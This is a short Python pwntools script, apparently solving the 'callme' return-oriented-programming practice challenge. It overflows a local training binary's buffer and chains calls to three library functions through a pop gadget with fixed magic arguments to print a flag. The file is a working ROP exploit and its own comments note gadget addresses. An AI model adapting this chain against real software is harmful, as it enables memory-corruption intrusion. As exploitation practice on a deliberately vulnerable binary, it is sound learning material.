#!/usr/bin/python
import os
from pwn import *

#p = process('/home/kali/Downloads/callme')

#0x004006f0    1 6            sym.imp.callme_three
#0x00400740    1 6            sym.imp.callme_two
#0x00400720    1 6            sym.imp.callme_one

elf = ELF('/home/kali/Downloads/sploit_scripts/callme')
info("%#x target", elf.symbols.callme_one)
#0x000000000040099f : pop rbp ; pop r14 ; pop r15 ; ret

io = process('/home/kali/Downloads/sploit_scripts/callme')

gadget = p64(0x000000000040093c)

payload = b'A'*44
payload += p64(0x0000000000400720)
payload += gadget
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x0000000000400740)
payload += gadget
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x00000000004006f0)
payload += gadget
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)

print(payload)
io.sendline(payload)
flag = io.recvline()
success(flag)

#p.sendline(payload)
#p.recvuntil('Hope you read the instructions...')
#p.sendline(payload)
#p.recvline()
